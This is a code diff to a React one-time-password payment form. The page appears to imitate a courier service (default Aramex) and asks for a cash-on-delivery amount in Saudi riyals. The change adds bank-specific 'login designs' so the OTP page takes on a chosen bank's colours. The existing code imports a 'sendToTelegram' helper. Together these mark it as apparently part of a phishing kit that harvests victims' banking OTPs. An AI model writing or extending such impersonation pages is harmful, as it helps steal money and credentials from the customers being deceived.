@@ -8,6 +8,8 @@ import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
+import { getBankById } from "@/lib/banks";
+import { getBankLoginDesign } from "@/lib/bankLoginDesigns";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -24,12 +26,22 @@ const PaymentOTPForm = () => {
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
+  const selectedBankId = sessionStorage.getItem('selectedBank') || linkData?.payload?.selected_bank || '';
+  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
+  
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
+  // Get bank design if bank is selected, otherwise use service branding
+  const bankDesign = selectedBank ? getBankLoginDesign(selectedBank.id) : null;
+  const designColors = bankDesign ? {
+    primary: bankDesign.primaryColor,
+    secondary: bankDesign.secondaryColor,
+  } : branding.colors;
+  
   const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
   // Demo OTP: 123456
@@ -244,7 +256,7 @@ const PaymentOTPForm = () => {
         <div 
           className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: `linear-gradient(135deg, ${designColors.primary}, ${designColors.secondary})`
           }}
         >
           <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
@@ -257,8 +269,8 @@ const PaymentOTPForm = () => {
       <div 
         className="rounded-lg p-3 sm:p-4 mb-6"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `${designColors.primary}10`,
+          border: `1px solid ${designColors.primary}30`
         }}
       >
         <p className="text-xs sm:text-sm text-center">
@@ -284,8 +296,8 @@ const PaymentOTPForm = () => {
                 onPaste={handlePaste}
                 className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                 style={{
-                  borderColor: digit ? branding.colors.primary : undefined,
-                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
+                  borderColor: digit ? designColors.primary : undefined,
+                  backgroundColor: digit ? `${designColors.primary}08` : undefined
                 }}
                 disabled={attempts >= 3}
                 autoComplete="off"
@@ -331,7 +343,7 @@ const PaymentOTPForm = () => {
           style={{
             background: attempts >= 3 
               ? '#666' 
-              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+              : `linear-gradient(135deg, ${designColors.primary}, ${designColors.secondary})`
           }}
         >
           {attempts >= 3 ? (
@@ -349,7 +361,7 @@ const PaymentOTPForm = () => {
             type="button"
             variant="ghost"
             className="w-full mt-3"
-            style={{ color: branding.colors.primary }}
+            style={{ color: designColors.primary }}
             onClick={() => {
               setCountdown(60);
               toast({
